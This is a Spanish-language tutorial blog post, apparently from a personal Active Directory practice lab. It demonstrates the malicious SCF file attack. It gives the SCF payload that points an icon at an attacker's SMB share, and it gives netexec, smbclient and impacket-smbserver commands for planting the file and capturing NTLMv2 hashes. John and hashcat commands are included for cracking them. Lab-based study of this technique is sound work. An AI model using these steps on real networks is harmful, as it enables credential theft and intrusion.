---
layout: single
title: Ataque Malicious SCF file
excerpt: "En este Post, enseñare a realizar el ataque SCF file, explicando en que consiste el ataque, y como lo podemos replicar. Todo desde mi laboratorio personal de prácticas de Active Directory ofensivo."
date: 2026-08-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-shocker/
  teaser_home_page: true
  icon: /assets/images/
categories:
  - Active Directory
  - Web-documentation
  - Pentesting
tags:
  - SCF-file
  - Poisoning
  - hash
  - crack-hashes
---

Esta técnica se basa en que estos tipos de archivos, exactamente el icono del archivo a nivel de visualización, al ser cargado en el explorador de archivos lo podemos envenenar y capturar el hash NTLMv2 de quien lo visualice.

> [Referencia del ataque SMB SCF](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

```bash
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

### COMO CONFIGURAR EL ATAQUE
Si tenemos la capacidad de escritura para subir archivos a un recurso compartido, podemos aprovecharnos de esto para subir este archivo .scf vulnerable.

Nos vamos a "**Servicios de archivos y almacenamiento**" en nuestro panel de DC.

Ahora a "**Recursos compartidos**".

Le damos a Tareas > "**Crear un recurso compartido**" > y el perfil "**Rápido**".

Me creo una ruta personalizada cual voy a definir en el escritorio en una directorio llamada <span style="color:lightblue">SharedFiles</span>.

Marcamos la primera opción de que si tenemos privilegios de lectura o similares sobre un share, podemos verlo. En caso contrario, no se mostrara al listar los shares.

A nivel de permisos añadiremos a <span style="color:blue">Santigo García</span> para que pueda subir archivos en cuanto a recursos de red respecta.

Le damos permisos de **Control total**.

Seguimos adelante y nos dirá que se ha creado.

Insertamos el código malicioso del principio, y definimos nuestra IP y el recurso en red nuestro, cual recibiremos el hash NTLMv2:

Con netexec listamos los shares con el usuario **Pablo Martinez** ya que tiene permisos de escritura y lectura en el share que habíamos creado:

```bash
nxc smb DC-01 -u "sgarcia" -p '@Maria99love' --shares
```

Nos conectamos por smbclient al share.

```bash
smbclient //DC-01/SharedFiles -U "sgarcia%@Maria99love"
```

Subimos el archivo mediante `put` en el recurso compartido a nivel de red.

Nos creado el recurso compartido en red con el nombre definido en el código malicioso "**smbFolder**".

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

### COMO REPLICAR EL ATAQUE

Si conseguimos que el administrador entre al respectivo share donde se almacena el archivo malicioso SCF, solo con visualizarlo y cargar el icono de este, ya cogeremos de forma paralela su hash NTLMv2.

Aquí vemos el hash NTLMv2 del Administrador.

Podemos usar *John The Ripper* o *hashcat* para crackearlo.

```bash
john --wordlist=../../wordlist/wordlists_passwords.txt hash-admin
hashcat -m 5600 -a 0 hash-admin ../../wordlist/wordlists_passwords.txt
```

